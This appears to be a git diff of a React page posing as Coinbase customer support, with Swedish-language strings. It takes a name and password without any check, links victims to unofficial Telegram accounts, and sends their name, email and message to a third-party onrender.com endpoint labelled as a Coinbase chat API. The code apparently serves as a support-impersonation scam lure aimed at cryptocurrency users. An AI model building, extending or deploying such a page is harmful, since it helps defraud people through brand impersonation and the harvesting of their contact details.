@@ -1,10 +1,13 @@
-import React, { useEffect, useState } from "react";
+import React, { useState } from "react";
 import ReactDOM from "react-dom/client";
 
 function App() {
   const [name, setName] = useState("");
   const [password, setPassword] = useState("");
+  const [email, setEmail] = useState("");
+  const [message, setMessage] = useState("");
   const [loggedIn, setLoggedIn] = useState(false);
+  const [sent, setSent] = useState(false);
 
   const handleLogin = () => {
     if (name.trim() && password.trim()) {
@@ -12,11 +15,18 @@ function App() {
     }
   };
 
-  useEffect(() => {
-    if (loggedIn) {
-      window.location.href = "https://t.me/coinbaseeuropesupport";
-    }
-  }, [loggedIn]);
+  const sendEmail = async () => {
+    if (!email || !message) return;
+    await fetch("https://coinbase-chat-api.onrender.com/send-support-message", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ name, email, message })
+    });
+    setSent(true);
+    setEmail("");
+    setMessage("");
+    setTimeout(() => setSent(false), 3000);
+  };
 
   return (
     <div style={wrapper}>
@@ -25,24 +35,23 @@ function App() {
           style={{ width: 70, height: 70, filter: 'brightness(0) invert(1)', marginBottom: 20 }} />
         {!loggedIn ? (
           <>
-            <h2 style={{ marginBottom: 20 }}>Log in to Support</h2>
-            <input
-              style={inputStyle}
-              placeholder="Your name"
-              value={name}
-              onChange={(e) => setName(e.target.value)}
-            />
-            <input
-              type="password"
-              style={inputStyle}
-              placeholder="Your password"
-              value={password}
-              onChange={(e) => setPassword(e.target.value)}
-            />
-            <button style={buttonStyle} onClick={handleLogin}>Login</button>
+            <h2 style={{ marginBottom: 20 }}>Logga in till support</h2>
+            <input style={inputStyle} placeholder="Ditt namn" value={name} onChange={(e) => setName(e.target.value)} />
+            <input type="password" style={inputStyle} placeholder="Lösenord" value={password} onChange={(e) => setPassword(e.target.value)} />
+            <button style={buttonStyle} onClick={handleLogin}>Logga in</button>
           </>
         ) : (
-          <p>Redirecting to Telegram...</p>
+          <>
+            <h2>Välkommen, {name}</h2>
+            <a href="https://t.me/coinbasesupportbot" target="_blank" rel="noreferrer" style={linkButton}>
+              💬 Kontakta oss via Telegram
+            </a>
+            <p style={{ marginTop: 30 }}>Eller skicka ett meddelande via e-post:</p>
+            <input style={inputStyle} placeholder="Din e-post" value={email} onChange={(e) => setEmail(e.target.value)} />
+            <textarea rows="4" style={{ ...inputStyle, height: "100px" }} placeholder="Meddelande" value={message} onChange={(e) => setMessage(e.target.value)} />
+            <button style={buttonStyle} onClick={sendEmail}>📨 Skicka meddelande</button>
+            {sent && <p style={{ color: "lightgreen", marginTop: 10 }}>✅ Meddelandet skickades!</p>}
+          </>
         )}
       </div>
     </div>
@@ -88,6 +97,18 @@ const buttonStyle = {
   cursor: "pointer",
   fontSize: "16px",
   marginTop: "10px"
+};
+
+const linkButton = {
+  display: "block",
+  margin: "20px auto",
+  padding: "12px",
+  borderRadius: "8px",
+  backgroundColor: "#2563eb",
+  color: "#fff",
+  fontWeight: "600",
+  textDecoration: "none",
+  width: "100%"
 };
 
 ReactDOM.createRoot(document.getElementById("root")).render(<App />);
